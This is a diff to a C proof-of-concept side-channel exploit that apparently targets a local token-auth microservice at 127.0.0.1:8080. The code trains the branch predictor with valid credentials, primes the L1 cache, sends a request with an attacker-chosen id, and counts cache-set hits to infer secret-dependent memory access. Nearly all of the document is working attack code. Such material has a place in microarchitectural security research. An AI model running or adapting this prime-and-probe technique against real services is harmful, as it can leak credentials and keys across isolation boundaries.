@@ -17,23 +17,37 @@
 #define TRAINING_REPS 100
 #define PROBE_ARR_SIZE (L1_SIZE/sizeof(int))
 // ADDRESS SECRET_KEY[0] -> 0x555555556008
-// avg cache fetch time = 30 cycles
 
 unsigned int probe_array[PROBE_ARR_SIZE]; // allocates int array of size = L1_SIZE
+CURL *curl_handle;
+
+
 int main(int argc, char* argv[]) {
+    // prep data for request
     char* attack_id = "2";
     if (argc == 2){
         attack_id = argv[1]; 
     }
+    char attack_data[42];
+    snprintf(attack_data, 42, "username=user1&password=password&id=%s", attack_id);
+    char *valid_data = "username=user1&password=password&id=2";
 
-
-    int count[SETS] = {0};
+    // set up curl 
     curl_global_init(CURL_GLOBAL_ALL);
+    curl_handle = curl_easy_init();
+    if (curl_handle){
+        curl_easy_setopt(curl_handle, CURLOPT_URL, "http://127.0.0.1:8080/token-auth/");
+        curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, write_junk);
+    }
+
+
+    int count[SETS] = {0}; // for recording sets that have been touched
+    
     int loops = 10;
     while (loops > 0){
         // Train BP
         for(int i = 0; i < TRAINING_REPS; i++){
-                valid_request(); // send valid credentials
+                make_request(valid_data); // send valid credentials
             }
         
         // Prime L1 cache
@@ -47,7 +61,7 @@ int main(int argc, char* argv[]) {
         
         _mm_mfence(); // wait for prime to compelte before sending bad request
         // cache check 
-        bad_request(attack_id);
+        make_request(attack_data);
         _mm_mfence();
 
         check_cache_presence(count);
@@ -58,46 +72,21 @@ int main(int argc, char* argv[]) {
             printf("Set %d: %d\n", i, count[i]);
         }
     }
+
+
+    curl_easy_cleanup(curl_handle);
+
     return 0;
 }
 
 
-// send valid credentials with curl request for token to microservice
-void valid_request(){
-
-    CURL *curl_handle;
-    //CURLcode res;
-
-    curl_handle = curl_easy_init();
-    if (curl_handle){
-        char *data = "username=user1&password=password&id=2";
-
-        curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, write_junk);
-
-        curl_easy_setopt(curl_handle, CURLOPT_URL, "http://127.0.0.1:8080/token-auth/");
-        curl_easy_setopt(curl_handle, CURLOPT_POSTFIELDS, data);
-
-        curl_easy_perform(curl_handle);
-    }
-    curl_easy_cleanup(curl_handle);
+// send request with curl request for token to microservice
+void make_request(char *data){
+    curl_easy_setopt(curl_handle, CURLOPT_POSTFIELDS, data);
+    curl_easy_perform(curl_handle); 
 }
 
-void bad_request(char *attack_id){
-    CURL *curl_handle;
-    //CURLcode res;
 
-    curl_handle = curl_easy_init();
-    if (curl_handle){
-        char data[42];
-        snprintf(data, 42, "username=user1&password=password&id=%s", attack_id);
-        
-        curl_easy_setopt(curl_handle, CURLOPT_URL, "http://127.0.0.1:8080/token-auth/");
-        curl_easy_setopt(curl_handle, CURLOPT_POSTFIELDS, data);
-
-        curl_easy_perform(curl_handle);
-    }
-    curl_easy_cleanup(curl_handle);
-}
 
 void check_cache_presence(int *count){
     int present = 0;
@@ -124,7 +113,7 @@ void check_cache_presence(int *count){
             }
         }
     
-    printf("%d/%d cache hits\n", present, NO_LINES);
+    // printf("%d/%d cache hits\n", present, NO_LINES);
 }
 
 // returns junk so that curl doesnt write to console
